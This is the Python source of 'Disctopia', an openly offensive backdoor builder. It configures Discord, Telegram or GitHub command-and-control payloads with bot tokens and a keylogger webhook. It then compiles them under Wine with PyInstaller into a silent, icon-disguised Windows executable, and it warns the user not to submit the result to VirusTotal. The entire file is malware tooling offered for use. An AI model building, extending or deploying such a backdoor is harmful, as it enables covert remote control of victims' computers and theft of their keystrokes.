# -*- coding: utf-8 -*-

import os
import subprocess
import getpass
import requests
from prettytable import PrettyTable
from sys import platform as OS

def clear_screen():
    if OS.startswith("linux"):
        os.system("clear")

def print_banner():
    print(r'''
▓█████▄  ██▓  ██████  ▄████▄  ▄▄▄█████▓ ▒█████   ██▓███   ██▓ ▄▄▄      
▒██▀ ██▌▓██▒▒██    ▒ ▒██▀ ▀█  ▓  ██▒ ▓▒▒██▒  ██▒▓██░  ██▒▓██▒▒████▄    
░██   █▌▒██▒░ ▓██▄   ▒▓█    ▄ ▒ ▓██░ ▒░▒██░  ██▒▓██░ ██▓▒▒██▒▒██  ▀█▄  
░▓█▄   ▌░██░  ▒   ██▒▒▓▓▄ ▄██▒░ ▓██▓ ░ ▒██   ██░▒██▄█▓▒ ▒░██░░██▄▄▄▄██ 
░▒████▓ ░██░▒██████▒▒▒ ▓███▀ ░  ▒██▒ ░ ░ ████▓▒░▒██▒ ░  ░░██░ ▓█   ▓██▒
 ▒▒▓  ▒ ░▓  ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░  ▒ ░░   ░ ▒░▒░▒░ ▒▓▒░ ░  ░░▓   ▒▒   ▓▒█░
 ░ ▒  ▒  ▒ ░░ ░▒  ░ ░  ░  ▒       ░      ░ ▒ ▒░ ░▒ ░      ▒ ░  ▒   ▒▒ ░
 ░ ░  ░  ▒ ░░  ░  ░  ░          ░      ░ ░ ░ ▒  ░░        ▒ ░  ░   ▒   
   ░     ░        ░  ░ ░                   ░ ░            ░        ░  ░ v2.1.2
 ░                   ░                                                 

Made by Dimitris Kalopisis aka Ectos | Twitter: @DKalopisis

Run 'help use' to get started!
''')

# Payload settings templates
PAYLOAD_SETTINGS = {
    "discord": ["Backdoor Name", "Guild ID", "Bot Token", "Channel ID", "Keylogger Webhook"],
    "telegram": ["Backdoor Name", "Bot Token", "User ID", None, None],
    "github": ["Backdoor Name", "Github Token", "Github Repo", None, None]
}

def create_table(payload, settings):
    table = PrettyTable(["Setting", "Value"])
    if payload in PAYLOAD_SETTINGS:
        for name, value in zip(PAYLOAD_SETTINGS[payload], settings):
            if name:
                table.add_row([name, value])
    else:
        print("[!] Please select a valid payload!\n")
    return table

def get_pyinstaller_path():
    username = getpass.getuser()
    home = os.path.expanduser('~')
    candidates = [
        os.path.join(home, '.wine64', 'drive_c', 'users', username, 'Local Settings', 'Application Data', 'Programs', 'Python', 'Python38', 'Scripts', 'pyinstaller.exe'),
        os.path.join(home, '.wine64', 'drive_c', 'users', username, 'AppData', 'Local', 'Programs', 'Python', 'Python38', 'Scripts', 'pyinstaller.exe'),
        '/home/kali/.wine64/drive_c/users/kali/AppData/Local/Programs/Python/Python38/Scripts/pyinstaller.exe'
    ]
    for path in candidates:
        if os.path.exists(path):
            return path
    return None

def build_backdoor(payload, settings):
    if payload == "discord":
        try:
            with open("code/discord/main.py", 'r') as f:
                file = f.read()
            newfile = file.replace("{GUILD}", str(settings[1]))
            newfile = newfile.replace("{TOKEN}", str(settings[2]))
            newfile = newfile.replace("{CHANNEL}", str(settings[3]))
            newfile = newfile.replace("{KEYLOG_WEBHOOK}", str(settings[4]))
        except Exception as e:
            print(f"[!] Error reading template: {e}")
            return

        filename = f"{settings[0]}.py"
        with open(filename, 'w') as f:
            f.write(newfile)

        pyinstaller_path = get_pyinstaller_path()
        if not pyinstaller_path:
            print("[!] PyInstaller not found in Wine prefix. Please ensure Python and PyInstaller are installed under Wine.")
            return

        compile_command = [
            "wine", pyinstaller_path, "--onefile", "--noconsole", "--icon=img/exe_file.ico", filename
        ]
        subprocess.call(compile_command)
        for ext in [".py", ".spec"]:
            try:
                os.remove(settings[0] + ext)
            except FileNotFoundError:
                pass
        print('\n[+] The Backdoor can be found inside the "dist" directory')
        print('\nDO NOT UPLOAD THE BACKDOOR TO VIRUS TOTAL')
    else:
        print("[!] Build for this payload is not implemented yet.")

def update_code():
    url = 'https://api.github.com/repos/3ct0s/disctopia-c2/releases/latest'
    response = requests.get(url)
    latest_tag = response.json().get('tag_name', None)
    if not latest_tag:
        print("[!] Could not fetch latest release info.")
        return

    cmd = ['git', 'describe', '--tags']
    try:
        current_tag = subprocess.check_output(cmd).decode('utf-8').strip()
    except Exception:
        print("[!] Could not determine current git tag.")
        return

    if current_tag == latest_tag:
        print('[!] Code is up to date')
    else:
        print('[!] Updating code...')
        subprocess.run(['git', 'reset', '--hard', 'HEAD'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['git', 'fetch', '--tags', '--prune'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['git', 'pull', '--ff-only'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['git', 'checkout', latest_tag], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f'[!] Code has been updated to {latest_tag}')
        print('[*] Quitting...')
        exit()

def print_help(command=None, payload=None):
    if not command:
        print('''

Help Menu:

"help <command>" Displays more help for a specific command 

"use <payload>" Selects a payload to use

"set <setting> <value>" Sets a value to a valid setting

"config" Shows the settings and their values

"build" Packages the backdoor into an EXE file

"update" Gets the latest version of Disctopia

"exit" Terminates the builder

''')
    elif command == "use":
        print('''

Help Menu:

"use <payload>" Selects a payload to use

Payloads:

"discord" - A Discord based C2
"telegram" - A telegram based C2
"github" - A github based C2

''')
    elif command == "set":
        if not payload:
            print("[!] Please select a payload!\n")
        else:
            if payload == "discord":
                print('''

Help Menu:

"set <setting> <value>" Sets a value to a valid setting

Settings:

"name" - The name of the backdoor
"guild-id" - The ID of the Discord server
"bot-token" - The token of the Discord bot
"channel-id" - The ID of the Discord channel
"webhook" - The webhook for the keylogger

''')
            elif payload == "telegram":
                print('''

Help Menu:

"set <setting> <value>" Sets a value to a valid setting

Settings:

"name" - The name of the backdoor
"bot-token" - The token of the Telegram bot
"user-id" - The ID of the Telegram user

IMPORTANT: This can only be used with one agent online at a time!

''')
            elif payload == "github":
                print('''

Help Menu:

"set <setting> <value>" Sets a value to a valid setting

Settings:

"name" - The name of the backdoor
"github-token" - The token of the Github bot
"github-repo" - The name of the Github repo

''')
    else:
        print("[!] There is nothing more to show!\n")

def main():
    clear_screen()
    print_banner()

    payload = ""
    settings = ["None"] * 5

    while True:
        try:
            command = input(f"[+] {payload} > ").strip()
            if not command:
                continue
            command_list = command.split()

            cmd = command_list[0].lower()

            if cmd == "exit":
                print("\n[+] Exiting!")
                break

            elif cmd == "use":
                if len(command_list) < 2:
                    print("[!] Please specify a payload!")
                    continue
                chosen = command_list[1].lower()
                if chosen in PAYLOAD_SETTINGS:
                    payload = chosen
                    settings = ["None"] * 5
                    print(f"[+] Using {payload.capitalize()} C2")
                    table = create_table(payload, settings)
                    print(f"\n{table.get_string(title='Disctopia Backdoor Settings')}")
                    print("Run 'help set' for more information\n")
                else:
                    print("[!] Invalid payload!")

            elif cmd == "set":
                if len(command_list) < 3:
                    print("[!] Please specify a setting!\n")
                    continue
                if not payload:
                    print("[!] Please select a payload!\n")
                    continue
                setting, value = command_list[1].lower(), command_list[2]
                # Map settings to index for each payload
                setting_map = {
                    "discord": {"name": 0, "guild-id": 1, "bot-token": 2, "channel-id": 3, "webhook": 4},
                    "telegram": {"name": 0, "bot-token": 1, "user-id": 2},
                    "github": {"name": 0, "github-token": 1, "github-repo": 2}
                }
                if setting in setting_map[payload]:
                    idx = setting_map[payload][setting]
                    settings[idx] = value
                else:
                    print("[!] Invalid setting!\n")

            elif cmd == "config":
                if not payload:
                    print("[!] Please select a payload!\n")
                else:
                    table = create_table(payload, settings)
                    print(f"\n{table.get_string(title='Disctopia Backdoor Settings')}")
                    print("Run 'help set' for more information\n")

            elif cmd == "clear":
                clear_screen()

            elif cmd == "help":
                if len(command_list) == 1:
                    print_help()
                else:
                    print_help(command_list[1].lower(), payload)

            elif cmd == "build":
                if not payload:
                    print("[!] Please select a payload!\n")
                    continue
                confirm = input("[?] Are you sure you want to build the backdoor? (y/n): ").strip().lower()
                if confirm == "y":
                    print("[+] Building backdoor...")
                    build_backdoor(payload, settings)
                    break

            elif cmd == "update":
                update_code()
                break

            else:
                print("[!] Invalid command!\n")

        except KeyboardInterrupt:
            print("\n\n[+] Exiting")
            break

if __name__ == "__main__":
    main()
